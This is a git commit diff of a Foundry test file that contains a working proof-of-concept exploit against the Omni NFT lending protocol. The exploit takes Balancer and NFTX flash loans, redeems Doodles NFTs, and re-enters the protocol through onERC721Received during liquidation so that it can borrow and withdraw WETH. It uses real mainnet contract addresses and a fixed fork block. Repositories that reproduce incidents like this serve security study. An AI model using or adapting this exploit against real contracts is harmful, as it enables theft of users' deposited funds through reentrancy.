b6775d3712e7891ed2413686b1dfa0bf580ed0c7
SunWeb3Sec <107249780+SunWeb3Sec@users.noreply.github.com>
2022-07-15 15:22:22 +0800

    Fix interface

--- src/test/Omni_exp.sol
+++ src/test/Omni_exp.sol
@@ -4,170 +4,70 @@ pragma solidity ^0.8.10;
 import "forge-std/Test.sol";
 import "./interface.sol";
 
-interface IDOODLENFTXVault{
-
-    function flashLoan(
-        address receiver,
-        address token,
-        uint256 amount,
-        bytes memory data
-    ) external returns (bool);
-    function redeem(uint256 amount, uint256[] calldata specificIds)
-        external
-        returns (uint256[] calldata);
-    function balanceOf(address account) external view returns (uint256);
-    function mint(
-        uint256[] calldata tokenIds,
-        uint256[] calldata amounts /* ignored for ERC721 vaults */
-    ) external returns (uint256);
-}
-interface ISushiSwap{
-
-    function swapTokensForExactTokens(
-        uint256 amountOut,
-        uint256 amountInMax,
-        address[] memory path,
-        address to,
-        uint256 deadline
-    ) external returns (uint256[] memory amounts);
-    function swap(
-        uint256 amount0Out,
-        uint256 amount1Out,
-        address to,
-        bytes memory data
-    ) external;
-}
-interface IOmni{
-
-    function supplyERC721(
-        address asset,
-        DataTypes.ERC721SupplyParams[] memory tokenData,
-        address onBehalfOf,
-        uint16 referralCode
-    ) external;
-
-    function withdrawERC721(
-        address asset,
-        uint256[] memory tokenIds,
-        address to
-    ) external returns (uint256);
-   function liquidationERC721(
-        address collateralAsset,
-        address liquidationAsset,
-        address user,
-        uint256 collateralTokenId,
-        uint256 liquidationAmount,
-        bool receiveNToken
-    ) external;
-
-    struct ERC721SupplyParams {
-        uint256 tokenId;
-        bool useAsCollateral;
-    }
-    function borrow(
-        address asset,
-        uint256 amount,
-        uint256 interestRateMode,
-        uint16 referralCode,
-        address onBehalfOf
-    ) external;
-
-    function getUserAccountData(address user)
-        external
-        view
-        returns (
-            uint256 totalCollateralBase,
-            uint256 totalDebtBase,
-            uint256 availableBorrowsBase,
-            uint256 currentLiquidationThreshold,
-            uint256 ltv,
-            uint256 healthFactor,
-            uint256 erc721HealthFactor
-        );
-
-}
-interface DataTypes {
-    struct ERC721SupplyParams {
-        uint256 tokenId;
-        bool useAsCollateral;
-    }
-}
+// Credit: SupremacyCA, the poc rewritten from SupremacyCA.
 
 contract ContractTest is DSTest {
 
-    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IERC20 doodle = IERC20(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);
-    IERC721 doodlenft = IERC721(0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e);
-    IBalancerVault  balancervault   = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
-    IDOODLENFTXVault DOODLENFTXVault = IDOODLENFTXVault(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);
-    ISushiSwap SushiSwapRouter = ISushiSwap(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
-    IOmni OmniPool = IOmni(0xEBe72CDafEbc1abF26517dd64b28762DF77912a9);
-   // IOmni Pool = IOmni(0x50C7a557d408a5f5a7FDBE1091831728Ae7Eba45);
-    bytes32 constant RETURN_VALUE = keccak256("ERC3156FlashBorrower.onFlashLoan");
+    IDOODLENFTXVault doodleVault = IDOODLENFTXVault(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);
+    IBalancerVault  balancer   = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+    IERC721 doodles = IERC721(0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e);
+    ISushiSwap router = ISushiSwap(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
+    IOmni pool = IOmni(0xEBe72CDafEbc1abF26517dd64b28762DF77912a9);
     address private constant NToken = 0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e;
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-    NFTHolder NFTHolderContract;
     uint256 private nonce;
-    constructor(){
-        cheats.createSelectFork("mainnet", 15114361); // fork mainnet at block 15114361
-        weth.approve(address(SushiSwapRouter),type(uint256).max);
-        doodle.approve(address(SushiSwapRouter),type(uint256).max);
-        weth.approve(address(OmniPool),type(uint256).max);
-        doodlenft.setApprovalForAll(0xEBe72CDafEbc1abF26517dd64b28762DF77912a9,true);
-        doodlenft.setApprovalForAll(0x218615C78104e16B5F17764d35b905b638fe4a92,true);
-        doodlenft.setApprovalForAll(0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e,true);
-        
+    address private immutable owner;
+    address private _lib;
+    bytes32 constant private RETURN_VALUE = keccak256("ERC3156FlashBorrower.onFlashLoan");
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Not your biz!");
+        _;
     }
- 
- 
+
+    constructor() {
+        cheats.createSelectFork("mainnet", 15114361); // fork mainnet at block 15114361
+        owner = msg.sender;       // Hacker
+
+    }
+
     function testExploit() public{
-        NFTHolderContract = new NFTHolder();
-        // flshloan 1,000 WETH
+        payable(address(0)).transfer(address(this).balance);
+        emit log_named_uint("Before exploiting, ETH balance of attacker:", address(this).balance);
         address[] memory tokens = new address[](1);
-        tokens[0] = address(weth);
-        uint[] memory amounts = new uint[](1);
-        amounts[0] =  1000*10**18;
-        balancervault.flashLoan(address(this), tokens, amounts, '');
+        tokens[0] = address(WETH);
+
+        uint256[] memory amounts = new uint256[](1);
+        amounts[0] = 1000 ether;
+
+        balancer.flashLoan(address(this), tokens, amounts, "");
     }
 
     function receiveFlashLoan(
-        IERC20[] memory tokens,
-        uint256[] memory amounts,
-        uint256[] memory feeAmounts,
-        bytes memory userData
-    )
-        external
-    {
-        tokens;
-        amounts;
-        feeAmounts;
-        userData;
-         // flashloan 20 DOODLE
-        DOODLENFTXVault.flashLoan(address(this),address(doodle),20000000000000000000,'0x');
-        uint weth_balance = weth.balanceOf(address(this));
-        emit log_named_uint("Borrow WETH from balancer",weth_balance);
+        address[] memory,
+        uint256[] memory,
+        uint256[] memory,
+        bytes memory
+    ) external {
+        require(msg.sender == address(balancer), "You are not a market maker for Flash Loan!");
+        doodle.approve(address(doodle), type(uint256).max);
+        doodles.setApprovalForAll(address(doodle), true);
+        doodleVault.flashLoan(address(this), address(doodle), 20 ether, "");
     }
 
-    function onFlashLoan(
-        address initiator,
-        address token,
-        uint256 amount,
-        uint256 fee,
-        bytes calldata data
-    ) external  {
-        uint weth_balance = weth.balanceOf(address(this));
-        emit log_named_uint("Borrow WETH from balancer",weth_balance);
-        uint doodle_balance = doodle.balanceOf(address(this));
-        emit log_named_uint("Borrow DOODLE from balancer",doodle_balance);
-        address[] memory path = new address[](2);
-        path[0] = address(weth);
-        path[1] = address(doodle);
+    function onFlashLoan(address, address, uint256, uint256, bytes memory) external returns (bytes32) {
+        require(msg.sender == address(doodle), "You are not a market maker for Flash Loan!");
 
-        SushiSwapRouter.swapTokensForExactTokens(1000000000000000000,200000000000000000000,path,address(this),1657449026);
+        WETH.approve(address(router), type(uint256).max);
 
-        emit log_named_uint("DOODLE Balance",doodle.balanceOf(address(this)));
-        emit log_named_uint("WETH Balance",weth.balanceOf(address(this)));
-        emit log_named_uint("DOODLE NFT ", doodlenft.balanceOf(address(this)));
+        address[] memory _path = new address[](2);
+        _path[0] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH
+        _path[1] = 0x2F131C4DAd4Be81683ABb966b4DE05a549144443; // DOODLE
+
+        router.swapTokensForExactTokens(12e17, 200 ether, _path, address(this), block.timestamp);
+
         uint256[] memory _specificIds = new uint256[](20);
         _specificIds[0] = 4777;
         _specificIds[1] = 4784;
@@ -189,15 +89,24 @@ contract ContractTest is DSTest {
         _specificIds[17] = 720;
         _specificIds[18] = 5251;
         _specificIds[19] = 7425;
-        DOODLENFTXVault.redeem(20,_specificIds);
-        emit log_named_uint("DOODLE NFT ", doodlenft.balanceOf(address(this)));
-        emit log_named_address("NFTHolderContract ", address(NFTHolderContract));
+        
+        doodleVault.redeem(20, _specificIds);
+
+        require(doodles.balanceOf(address(this)) >= 20, "redeem error.");
+
+        Lib lib = new Lib();
+
+        _lib = address(lib);
+
+        lib.approve();
+
         uint256 length = _specificIds.length;
 
         for (uint256 i = 0; i < length; i++) {
-            doodlenft.transferFrom(address(this), address(NFTHolderContract), _specificIds[i]);
+            doodles.transferFrom(address(this), address(_lib), _specificIds[i]);
         }
-        NFTHolderContract.joker();
+        
+        lib.joker();
 
         uint256[] memory _amount = new uint256[](20);
  
@@ -205,29 +114,31 @@ contract ContractTest is DSTest {
             _amount[j] = 0;
         }
 
-        NFTHolderContract.withdrawAll();
-        DOODLENFTXVault.mint(_specificIds, _amount);
-        uint256 profit = getters();
-        emit log_named_uint("Profit of attacker:", profit);
-        payable(address(msg.sender)).transfer(profit);
+        require(ILib(_lib).withdrawAll(), "Withdraw Error.");
 
+        require(doodleVault.mint(_specificIds, _amount) == 20, "Error Amounts.");
+
+        uint256 profit = getters();
+        emit log_named_uint("After exploiting, ETH balance of attacker:", address(this).balance);
+   
+        return RETURN_VALUE;
 
     }
 
-  function onERC721Received(
-    address,
-    address,
-    uint256,
-    bytes memory
-  ) public returns (bytes4) {
-    
-     if(msg.sender == NToken) {
-     emit log_string("Re entered");
-     if (nonce == 21) {
-     OmniPool.liquidationERC721(0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e,address(weth),0x23F8770bd80EFFA7F09dFfdc12A35B7221d5cad3,1067,100 ether,false);
-     return this.onERC721Received.selector;
-       
-      } else if (nonce == 22) {
+    function onERC721Received(
+        address,
+        address,
+        uint256,
+        bytes calldata
+    ) external returns (bytes4) {
+        if (msg.sender == NToken) {
+            if (nonce == 21) {
+                nonce++;
+                WETH.approve(address(pool), type(uint256).max);
+                pool.liquidationERC721(address(doodles), address(WETH), address(_lib), 7425, 100 ether, false);
+                return this.onERC721Received.selector;
+            } else if (nonce == 22) {
+
                 uint256[] memory _specificIds = new uint256[](3);
                 _specificIds[0] = 720;
                 _specificIds[1] = 5251;
@@ -235,13 +146,15 @@ contract ContractTest is DSTest {
 
                 uint256 length = _specificIds.length;
                 for (uint256 i = 0; i < length; i++) {
-                    doodlenft.safeTransferFrom(address(this), address(NFTHolderContract), _specificIds[i]);
+                    doodles.safeTransferFrom(address(this), address(_lib), _specificIds[i]);
                 }
-                nonce = 1337;
-                NFTHolderContract.attack();
-            return this.onERC721Received.selector;
 
-      }  else {
+                nonce = 1337;
+
+                require(ILib(_lib).attack(), "Attack Error!");
+
+                return this.onERC721Received.selector;
+            } else {
                 nonce++;
                 return this.onERC721Received.selector;
             }
@@ -250,8 +163,6 @@ contract ContractTest is DSTest {
         }
     }
 
- 
-  
     function getters() internal returns (uint256) {
         uint256[] memory _specificIds = new uint256[](20);
         _specificIds[0] = 4777;
@@ -297,11 +208,11 @@ contract ContractTest is DSTest {
         _amounts[18] = 0;
         _amounts[19] = 0;
 
-        weth.transfer(address(balancervault), 1000 ether);
+        WETH.transfer(address(balancer), 1000 ether);
 
-        uint256 balance = weth.balanceOf(address(this));
+        uint256 balance = WETH.balanceOf(address(this));
 
-        weth.withdraw(balance);
+        WETH.withdraw(balance);
 
         return address(this).balance;
     }
@@ -310,26 +221,30 @@ contract ContractTest is DSTest {
 
 }
 
+contract Lib {
 
-
-   
-contract NFTHolder {
-    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    address private immutable exp;
+    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IERC20 doodle = IERC20(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);
-    IERC721 doodlenft = IERC721(0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e);
-    IBalancerVault  vault   = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
-    IDOODLENFTXVault DOODLENFTXVault = IDOODLENFTXVault(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);
-    ISushiSwap SushiSwapRouter = ISushiSwap(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
-    IOmni OmniPool = IOmni(0xEBe72CDafEbc1abF26517dd64b28762DF77912a9);
-    IOmni Pool = IOmni(0x50C7a557d408a5f5a7FDBE1091831728Ae7Eba45);
-    address deployer = msg.sender;
+    IERC721 doodles = IERC721(0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e);
+    IOmni pool = IOmni(0xEBe72CDafEbc1abF26517dd64b28762DF77912a9);
+    address private constant NToken = 0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e;
 
-    constructor(){
-        doodlenft.setApprovalForAll(address(OmniPool), true);
-        weth.approve(address(OmniPool), type(uint256).max);
+    modifier onlyExp() {
+        require(msg.sender == exp, "Not your biz!");
+        _;
     }
 
-    function joker() external  {
+    constructor() {
+        exp = msg.sender;
+    }
+
+    function approve() external onlyExp {
+        doodles.setApprovalForAll(address(pool), true);
+        WETH.approve(address(pool), type(uint256).max);
+    }
+
+    function joker() external onlyExp {
         DataTypes.ERC721SupplyParams[] memory _params = new DataTypes.ERC721SupplyParams[](3);
 
         _params[0].tokenId = 720;
@@ -341,22 +256,22 @@ contract NFTHolder {
         _params[2].tokenId = 7425;
         _params[2].useAsCollateral = true;
 
-        OmniPool.supplyERC721(address(doodlenft), _params, address(this), 0);
+        pool.supplyERC721(address(doodles), _params, address(this), 0);
 
-        (,, uint256 amount,,,,) = OmniPool.getUserAccountData(address(this));
+        (,, uint256 amount,,,,) = pool.getUserAccountData(address(this));
 
-        OmniPool.borrow(address(weth), amount, 2, 0, address(this));
+        pool.borrow(address(WETH), amount, 2, 0, address(this));
 
         uint256[] memory tokenIds = new uint256[](2);
 
         tokenIds[0] = 720;
         tokenIds[1] = 5251;
 
-        OmniPool.withdrawERC721(address(doodlenft), tokenIds, address(deployer));
+        require(pool.withdrawERC721(address(doodles), tokenIds, address(exp)) == 2, "Withdraw Error.");
     }
 
-    function attack() external returns (bool) {
-        doodlenft.setApprovalForAll(address(OmniPool), true);
+    function attack() external onlyExp returns (bool) {
+        doodles.setApprovalForAll(address(pool), true);
 
         DataTypes.ERC721SupplyParams[] memory _params = new DataTypes.ERC721SupplyParams[](20);
 
@@ -420,16 +335,16 @@ contract NFTHolder {
         _params[19].tokenId = 7425;
         _params[19].useAsCollateral = true;            
 
-        OmniPool.supplyERC721(address(doodlenft), _params, address(this), 0);
+        pool.supplyERC721(address(doodles), _params, address(this), 0);
 
-        (,,uint256 amount,,,,) = OmniPool.getUserAccountData(address(this));
+        (,, uint256 amount,,,,) = pool.getUserAccountData(address(this));
 
-        OmniPool.borrow(address(weth), amount, 2, 0, address(this));
+        pool.borrow(address(WETH), amount, 2, 0, address(this));
 
         return true;
     }
 
-    function withdrawAll() external returns (bool) {
+    function withdrawAll() external onlyExp returns (bool) {
         uint256[] memory _specificIds = new uint256[](20);
         _specificIds[0] = 4777;
         _specificIds[1] = 4784;
@@ -452,11 +367,11 @@ contract NFTHolder {
         _specificIds[18] = 5251;
         _specificIds[19] = 7425;
 
-        OmniPool.withdrawERC721(address(doodlenft), _specificIds, address(deployer));
+        pool.withdrawERC721(address(doodles), _specificIds, address(exp));
 
-        uint256 balance = weth.balanceOf(address(this));
+        uint256 balance = WETH.balanceOf(address(this));
 
-        weth.transfer(address(deployer), balance);
+        WETH.transfer(address(exp), balance);
 
         return true;
     } 
@@ -470,4 +385,3 @@ contract NFTHolder {
         return this.onERC721Received.selector;
     }
 }
-
